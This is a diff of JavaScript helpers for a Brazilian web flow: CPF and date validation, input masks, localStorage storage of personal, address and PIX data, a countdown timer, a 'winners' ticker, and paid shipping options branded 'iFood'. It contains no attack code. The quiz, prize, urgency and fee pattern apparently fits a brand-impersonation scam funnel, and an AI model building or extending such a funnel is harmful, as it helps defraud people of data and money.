+    if (v.length <= 10) {
+        input.value = `(${v.slice(0, 2)}) ${v.slice(2, 6)}-${v.slice(6)}`;
+        return;
+    }
+    input.value = `(${v.slice(0, 2)}) ${v.slice(2, 7)}-${v.slice(7)}`;
+}
+
+function maskCep(input) {
+    if (!input) return;
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 8) value = value.slice(0, 8);
+    if (value.length > 5) {
+        value = `${value.slice(0, 5)}-${value.slice(5)}`;
+    }
+    input.value = value;
+}
+
+function validateCPF(cpf) {
+    cpf = cpf.replace(/[^\d]+/g, '');
+    if (!cpf || cpf.length !== 11) return false;
+    if (/^(\d)\1{10}$/.test(cpf)) return false;
+
+    let add = 0;
+    for (let i = 0; i < 9; i += 1) add += parseInt(cpf.charAt(i), 10) * (10 - i);
+    let rev = 11 - (add % 11);
+    if (rev === 10 || rev === 11) rev = 0;
+    if (rev !== parseInt(cpf.charAt(9), 10)) return false;
+
+    add = 0;
+    for (let i = 0; i < 10; i += 1) add += parseInt(cpf.charAt(i), 10) * (11 - i);
+    rev = 11 - (add % 11);
+    if (rev === 10 || rev === 11) rev = 0;
+    if (rev !== parseInt(cpf.charAt(10), 10)) return false;
+
+    return true;
+}
+
+function isValidDate(value) {
+    const match = value.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
+    if (!match) return false;
+
+    const day = parseInt(match[1], 10);
+    const month = parseInt(match[2], 10);
+    const year = parseInt(match[3], 10);
+
+    const now = new Date();
+    const currentYear = now.getFullYear();
+
+    if (year < 1900 || year > currentYear) return false;
+
+    const date = new Date(year, month - 1, day);
+    if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) return false;
+    if (date > now) return false;
+
+    return true;
+}
+
+function isValidEmail(value) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+}
+
+function isValidPhone(value) {
+    const digits = value.replace(/\D/g, '');
+    return digits.length >= 10 && digits.length <= 11;
+}
+
+function formatCep(rawCep) {
+    if (!rawCep || rawCep.length !== 8) return rawCep || '-';
+    return `${rawCep.slice(0, 5)}-${rawCep.slice(5)}`;
+}
+
+function formatCurrency(value) {
+    return new Intl.NumberFormat('pt-BR', {
+        style: 'currency',
+        currency: 'BRL'
+    }).format(value);
+}
+
+function buildShippingOptions(rawCep) {
+    return [
+        {
+            id: 'economico',
+            name: 'Envio Econômico iFood',
+            price: 19.9,
+            eta: '5 a 8 dias úteis'
+        },
+        {
+            id: 'padrao',
+            name: 'Envio Padrão iFood',
+            price: 25.9,
+            eta: '3 a 5 dias úteis'
+        },
+        {
+            id: 'expresso',
+            name: 'Envio Prioritário iFood',
+            price: 29.9,
+            eta: '1 a 3 dias úteis'
+        }
+    ];
+}
+
+function saveShipping(data) {
+    localStorage.setItem(STORAGE_KEYS.shipping, JSON.stringify(data));
+}
+
+function loadShipping() {
+    try {
+        const raw = localStorage.getItem(STORAGE_KEYS.shipping);
+        return raw ? JSON.parse(raw) : null;
+    } catch (error) {
+        return null;
+    }
+}
+
+function saveAddressExtra(data) {
+    localStorage.setItem(STORAGE_KEYS.addressExtra, JSON.stringify(data));
+}
+
+function loadAddressExtra() {
+    try {
+        const raw = localStorage.getItem(STORAGE_KEYS.addressExtra);
+        return raw ? JSON.parse(raw) : null;
+    } catch (error) {
+        return null;
+    }
+}
+
+function savePix(data) {
+    localStorage.setItem(STORAGE_KEYS.pix, JSON.stringify(data));
+}
+
+function loadPix() {
+    try {
+        const raw = localStorage.getItem(STORAGE_KEYS.pix);
+        return raw ? JSON.parse(raw) : null;
+    } catch (error) {
+        return null;
+    }
+}
+
+function setHidden(element, shouldHide) {
+    if (!element) return;
+    element.classList.toggle('hidden', shouldHide);
+    element.setAttribute('aria-hidden', shouldHide ? 'true' : 'false');
+}
+
+function showInlineError(container, message) {
+    if (!container) {
+        showToast(message, 'error');
+        return;
+    }
+    container.textContent = message;
+    container.classList.remove('hidden');
+}
+
+function clearInlineError(container) {
+    if (!container) return;
+    container.textContent = '';
+    container.classList.add('hidden');
+}
+
+function resetCepResults(errorBox, addressResult, freightBox, btnBuscar, loadingRow) {
+    clearInlineError(errorBox);
+    setHidden(addressResult, true);
+    setHidden(freightBox, true);
+    setHidden(loadingRow, true);
+    btnBuscar?.classList.remove('hidden');
+}
+
+function focusFirstControl(container) {
+    if (!container) return;
+    const focusTarget = container.querySelector('input, button, select, textarea');
+    if (focusTarget) {
+        setTimeout(() => focusTarget.focus(), 50);
+    }
+}
+
+function startTimer(duration, display) {
+    if (!display) return;
+    if (state.timerId) clearInterval(state.timerId);
+    let timer = duration;
+
+    state.timerId = setInterval(() => {
+        const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
+        const seconds = String(timer % 60).padStart(2, '0');
+        display.textContent = `${minutes}:${seconds}`;
+
+        if (timer > 0) {
+            timer -= 1;
+        }
+    }, 1000);
+}
+
+function startTicker(container) {
+    if (!container) return;
+    if (state.tickerId) clearInterval(state.tickerId);
+
+    let idx = 0;
+    container.innerText = winners[0];
+
+    state.tickerId = setInterval(() => {
+        idx = (idx + 1) % winners.length;
+        container.style.opacity = 0;
+        setTimeout(() => {
+            container.innerText = winners[idx];
+            container.style.opacity = 1;
+        }, 500);
+    }, 4000);
+}
+
+function showToast(message, type = 'info') {
+    if (!dom.toast) {
+        alert(message);
+        return;
+    }
+
+    dom.toast.textContent = message;
+    dom.toast.classList.remove('hidden', 'toast--success', 'toast--error', 'toast--info');
+
+    if (type === 'success') dom.toast.classList.add('toast--success');
+    if (type === 'error') dom.toast.classList.add('toast--error');
+
+    requestAnimationFrame(() => {
+        dom.toast.classList.add('toast--show');
+    });
+
+    if (state.toastTimeout) clearTimeout(state.toastTimeout);
+    state.toastTimeout = setTimeout(() => {
+        dom.toast.classList.remove('toast--show');
+        setTimeout(() => dom.toast.classList.add('hidden'), 200);
+    }, 2800);
+}
+
+function savePersonal(data) {
+    localStorage.setItem(STORAGE_KEYS.personal, JSON.stringify(data));
+}
+
+function loadPersonal() {
+    try {
+        const raw = localStorage.getItem(STORAGE_KEYS.personal);
+        return raw ? JSON.parse(raw) : null;
+    } catch (error) {
+        return null;
+    }
+}
+
+function saveAddress(data) {
+    localStorage.setItem(STORAGE_KEYS.address, JSON.stringify(data));
+}
+
+function loadAddress() {
+    try {
+        const raw = localStorage.getItem(STORAGE_KEYS.address);
+        return raw ? JSON.parse(raw) : null;
+    } catch (error) {
+        return null;
+    }
+}
+
+function saveQuizComplete() {
+    localStorage.setItem(STORAGE_KEYS.quizComplete, 'true');
+}
+
+function setStage(stage) {
+    if (!stage) return;
+    localStorage.setItem(STORAGE_KEYS.stage, stage);
+}
+
+function getStage() {
+    return localStorage.getItem(STORAGE_KEYS.stage) || '';
+}
+
+function resetFlow() {
+    localStorage.removeItem(STORAGE_KEYS.personal);
+    localStorage.removeItem(STORAGE_KEYS.address);
+    localStorage.removeItem(STORAGE_KEYS.quizComplete);
+    localStorage.removeItem(STORAGE_KEYS.stage);
+    localStorage.removeItem(STORAGE_KEYS.shipping);
+    localStorage.removeItem(STORAGE_KEYS.addressExtra);
+    localStorage.removeItem(STORAGE_KEYS.pix);
+    sessionStorage.removeItem(STORAGE_KEYS.stock);
+    sessionStorage.removeItem(STORAGE_KEYS.returnTo);
+}
+
+function resolveResumeUrl() {
+    const stage = getStage();
+
+    if (stage === 'quiz') return 'quiz.html';
+    if (stage === 'personal') return 'dados.html';
+    if (stage === 'cep') return 'endereco.html';
+    if (stage === 'processing') return 'processando.html';
+    if (stage === 'success') return 'sucesso.html';
+    if (stage === 'checkout') return 'checkout.html';
+    if (stage === 'pix') return 'pix.html';
+    if (stage === 'complete') return 'checkout.html';
+    if (loadPersonal() && !loadAddress()) return 'endereco.html';
+    if (loadPersonal() && loadAddress()) return 'checkout.html';
+
+    return null;
+}
+
+function getReturnTarget() {
+    const params = new URLSearchParams(window.location.search);
+    const queryReturn = params.get('return');
+    if (queryReturn) {
+        sessionStorage.setItem(STORAGE_KEYS.returnTo, queryReturn);
+        return queryReturn;
+    }
+    return sessionStorage.getItem(STORAGE_KEYS.returnTo) || '';
+}
+
+function requirePersonal() {
+    const personal = loadPersonal();
+    if (!personal || !personal.name || !personal.cpf || !personal.birth || !personal.email || !personal.phone) {
+        redirect('dados.html');
+        return false;
+    }
+    return true;
+}
+
+function requireAddress() {
+    if (!loadAddress()) {
+        redirect('endereco.html');
+        return false;
+    }
+    return true;
+}
+
+function redirect(url) {
+    window.location.href = url;
+}
+
